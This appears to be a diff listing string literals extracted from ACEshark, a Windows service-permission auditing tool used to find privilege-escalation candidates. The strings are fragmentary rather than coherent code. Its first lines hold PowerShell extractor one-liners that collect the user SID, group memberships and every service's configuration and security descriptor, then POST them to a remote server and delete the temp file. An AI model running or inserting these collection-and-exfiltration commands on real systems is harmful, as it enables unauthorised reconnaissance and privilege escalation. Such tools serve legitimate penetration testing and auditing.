@@ -1,0 +1,146 @@
+"'          {ORNG}Potentially Abusable{"" - Great Candidate"" if great_candidate else """"}!{RST}"
+"'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}""); Set-Content -Path $f -Value """"; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + ""</groups>""); Get-ChildItem -Path ""HKLM:\\SYSTEM\\CurrentControlSet\\Services"" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join ""{DELIMITER}""; Add-Content -Path $f -Value ""$($_.PSChildName)::$x`n$c"" }}; $d=Get-Content -Path $f -Raw; IRM -Uri ""{""http"" if not tls else ""https""}://{server_address}:{port}/{POST_DATA_ENDPOINT}"" -Method POST -Body @{{data=$d}}; del $f"
+"'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}""); Set-Content -Path $f -Value """"; Add-Content -Path $f -Value (([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)); Add-Content -Path $f -Value ((whoami /groups) + ""</groups>""); Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join ""{DELIMITER}""; Add-Content -Path $f -Value ""$($_.Name)::$x`n$c"" }}; $d=Get-Content -Path $f -Raw; IRM -Uri ""{""http"" if not tls else ""https""}://{server_address}:{port}/{POST_DATA_ENDPOINT}"" -Method POST -Body @{{data=$d}}; del $f"
+"'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}""); Set-Content -Path $f -Value """"; Get-ChildItem -Path ""HKLM:\\SYSTEM\\CurrentControlSet\\Services"" | % {{ $c=sc.exe sdshow $_.PSChildName; $x=(sc.exe qc $_.PSChildName | ForEach-Object {{ $_.Trim() }}) -join ""{DELIMITER}"";Add-Content -Path $f -Value ""$($_.PSChildName)::$x`n$c"" }}; $d=Get-Content -Path $f -Raw; IRM -Uri ""{""http"" if not tls else ""https""}://{server_address}:{port}/{POST_DATA_ENDPOINT}"" -Method POST -Body @{{data=$d}}; del $f"
+"'$f=[System.IO.Path]::Combine($env:ALLUSERSPROFILE, ""{SRVS_CONF_FILENAME}""); Set-Content -Path $f -Value """"; Get-Service | % {{ $c=sc.exe sdshow $_.Name; $x=(sc.exe qc $_.Name | ForEach-Object {{ $_.Trim() }}) -join ""{DELIMITER}"";Add-Content -Path $f -Value ""$($_.Name)::$x`n$c"" }}; $d=Get-Content -Path $f -Raw; IRM -Uri ""{""http"" if not tls else ""https""}://{server_address}:{port}/{POST_DATA_ENDPOINT}"" -Method POST -Body @{{data=$d}}; del $f"
+"'', "
+"', "
+"',"
+"': 0, "
+"': args.certfile, "
+"': args.port, "
+"'\n{DEBUG} A single mode can be used at a time:\n   -i, --interesting-only\n   -g, --great-candidates\n   -a, --audit\n   -x, --custom-mode"
+"'\n{DEBUG} Only one option can be used: -s, --server-address or -f, --file input"
+"'\n{DEBUG} Select a mode:\n   -i, --interesting-only\n   -g, --great-candidates\n   -a, --audit\n   -x, --custom-mode"
+"'\n{DEBUG} You must specify either -s, --server-address or -f, --file input."
+"'\n{INFO} Waiting for script execution on the target, be patient..."
+"'s a great PE candidate, other Windows security features may still block its abuse."
+"'{DEBUG} This log was generated in Audit mode and cannot be used for service analysis in -i (--interesting-only), -x (--custom-mode), or -g (--great-candidates) modes. FYI, the opposite is possible."
+"'{IMP} If your TLS certificate is untrusted, you\"
+"'{INFO} Http server started. Try {ORNG}{""http"" if not tls else ""https""}://{args.server_address}:{port}/{DEBUG_ENDPOINT}{RST} if you wish to check if reachable."
+' 
+'          ACE Type: {BOLD}{ace_type}{RST}
+'          Binary Path: {binpath}
+'          Rights: {display_rights}
+'          User / Group: {BOLD}{BLUE}{obj_name}{RST} ({sid_val})
+'          User / Group: {BOLD}{sid}{RST}
+'          User / Group: {BOLD}{sid}{RST} ({sid_val})
+'          {RED}Running as SYSTEM{RST}
+'      [{PL}] Analyzing ACE {item}
+' Colors 
+' and log_mode == 
+' and start_type == 
+' else GC_pe_template) if not args.get_service else (GS_audit_template if mode == 
+' if args.audit else 
+' if not rights_detailed[0] else 
+' if sid_val == sid else f
+' {key} : {val}
+'#!ACEshark_log
+''
+'()
+').rsplit(
+'*
+'+
+'--certfile
+'--keyfile
+'--port
+'.join(tmp[0]).replace(
+'/{DEBUG_ENDPOINT}
+'/{POST_DATA_ENDPOINT}
+'0.0.0.0
+': stat.split(
+';;;
+'</groups>
+'ACEshark
+'Access-Control-Allow-Origin
+'BASIC OPTIONS
+'BINARY_PATH_NAME
+'Content-Length
+'Content-Type
+'Content-type
+'DEMAND_START
+'EXTRACTOR MODIFICATIONS
+'FAILED 
+'It works! Who would have thought?
+'LocalSystem
+'MODES
+'NT AUTHORITY\\System
+'NT+AUTHORITY\\System
+'None
+'OK
+'OUTPUT
+'OpenService FAILED
+'S
+'SERVICE_START_NAME
+'START_TYPE
+'TYPE
+'UNDISCLOSED
+'WIN32_OWN_PROCESS
+'[{DEBUG}] TLS implementation failed: {e}.\n
+'[{MAIN}Info{RST}]
+'[{ORNG}Debug{RST}]
+'[{ORNG}Important{RST}]
+'[{ORNG}Input{RST}]
+'[{ORNG}User Groups{RST}]\n {user_groups}
+'[{ORNG}User SID{RST}] {user_sid}
+'[{RED}Error{RST}]
+'[{RED}Oops!{RST}]
+'\033[0;38;5;12m
+'\033[0;38;5;141m
+'\033[0;38;5;201m
+'\033[0;38;5;214m
+'\033[0m
+'\033[1;31m
+'\033[1;38;5;214m
+'\033[1m
+'\033[38;5;50m
+'\033[38;5;82m
+'\\([0-9A-Za-z;\\-]*\\)
+'\n
+'\n                  
+'\s+
+'__main__
+'_debug_
+'audit
+'ignore
+'ll have to bypass certificate validation for this to work.
+'null_client
+'pe
+'r
+'reason
+'s ACEs suggest it\
+'status
+'t appear to be an ACEshark log file.
+'text/javascript; charset=UTF-8
+'text/plain
+'utf-8
+'utf16
+'w
+'{BOLD}[{LPURPLE}{service}{RST}][{service_type}][{start_type}] Running as user: {BOLD}{user_account}{RST}
+'{BOLD}[{RED}{service}{RST}] Service config query failed. Error Code: {reason}
+'{DEBUG} Hostname length greater than 255 characters.
+'{DEBUG} Int value {i} not in predefined generic access rights. Feel free to submit a pull request if you believe something is missing.
+'{DEBUG} Invalid generic access rights value. Please check your input and try again.
+'{DEBUG} Server address is not resolvable. Check input and try again.
+'{DEBUG} TLS support seems to be misconfigured (missing key or cert file).
+'{DEBUG} This doesn\
+'{ERR} Failed to create logs dir {ACEshark_logs_dir}.
+'{ERR} Failed to write services configuration to a file: {e} - Moving on.
+'{ERR} Port {port} seems to already be in use.\n
+'{ERR} {e}
+'{GREEN}+{RST}
+'{GREEN}{active_template}{RST}
+'{GREEN}{generic_access_rights[r.value]}{RST}
+'{IMP} Even if a service\
+'{INFO} Data retrieved! Processing...
+'{INFO} Done.
+'{INFO} Ignoring argument --{val}.
+'{INFO} Ignoring argument {key}.
+'{INFO} Initiating services audit.
+'{INFO} Run the following extractor script (or similar) on the target machine to retrieve the configuration of all services:
+'{OOPS} Something went really wrong: {e}
+'{ORNG}Copied to clipboard!{RST}
+'{RED}Copy to clipboard failed. Please do it manually.{RST}
+'{RED}{generic_access_rights[r.value]}{RST}
+'{RED}{r.value}{RST}
+'{sid_val} 
